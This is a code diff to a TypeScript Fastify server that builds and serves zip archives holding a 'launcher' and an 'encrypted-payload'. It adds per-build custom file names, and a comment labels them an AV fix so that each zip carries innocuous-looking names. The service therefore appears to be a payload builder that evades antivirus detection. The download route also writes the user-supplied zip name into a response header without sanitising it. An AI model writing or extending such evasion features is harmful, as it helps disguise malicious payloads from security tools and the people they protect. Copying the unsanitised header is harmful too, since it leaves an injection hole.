@@ -483,6 +483,23 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
           outDir: rawOutDir,
           debug: false, // silent production (the marker is opt-in via flags)
         },
+        // FIX 3: optional renameable names from the web app flags (defaults when
+        // blank -> byte-identical to the confirmed working flow).
+        names: {
+          updateLinkName:
+            typeof flags.updateLinkName === "string" ? flags.updateLinkName.trim() : "",
+          innerFolder:
+            typeof flags.innerFolder === "string" ? flags.innerFolder.trim() : "",
+          // served zip download filename (fallback "Agent.zip").
+          zipName:
+            typeof flags.zipName === "string" ? flags.zipName.trim() : "",
+          // FIX 3 (AV): renameable launcher + encrypted-payload entry names so
+          // every zip can carry innocuous, per-build file names.
+          launcherName:
+            typeof flags.launcherName === "string" ? flags.launcherName.trim() : "",
+          payloadName:
+            typeof flags.payloadName === "string" ? flags.payloadName.trim() : "",
+        },
       });
       if (!fs.existsSync(storage.zipOutputPath(jobId))) {
         throw new Error("launcher build finished without producing a zip");
@@ -668,7 +685,10 @@ async function getZipDownload(request: FastifyRequest, reply: FastifyReply) {
   }
 
   reply.header("Content-Type", "application/zip");
-  reply.header("Content-Disposition", 'attachment; filename="Agent.zip"');
+  // FIX 3: serve the custom persisted zip name when present (falls back to the
+  // default "Agent.zip" for legacy/unspecified builds).
+  const zipName = storage.getZipName(jobId) ?? "Agent.zip";
+  reply.header("Content-Disposition", `attachment; filename="${zipName}"`);
 
   return reply.send(fs.createReadStream(zipPath));
 }
